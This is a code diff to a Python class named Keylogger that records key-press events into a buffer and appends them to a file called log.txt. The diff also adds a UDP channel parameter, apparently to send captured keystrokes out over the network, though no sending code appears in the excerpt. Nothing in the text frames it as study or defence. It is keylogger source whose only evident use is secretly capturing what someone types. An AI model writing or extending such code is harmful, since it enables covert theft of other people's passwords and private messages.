@@ -10,9 +10,10 @@ class Keylogger:
     """
     Initializes the buffer.
     """
-    def __init__(self):
+    def __init__(self, udpChannel):
 
-        self.buffer = ""
+        self.buffer     = ""
+        self.udpChannel = udpChannel
 
 
     """
@@ -29,18 +30,11 @@ class Keylogger:
     """
     def onKeyPressed(self, event):
 
-        self.buffer += "{}\n".format(event.name)
+        self.buffer += "{} ".format(event.name)
 
-        if len(self.buffer) >= 10:
+        if len(self.buffer) >= 20:
 
             with open("log.txt", "a") as logfile:
 
                 logfile.write(self.buffer)
                 self.buffer = ""
-
-
-"""
------------------------------------------------------
-"""
-keylogger = Keylogger()
-keylogger.run()
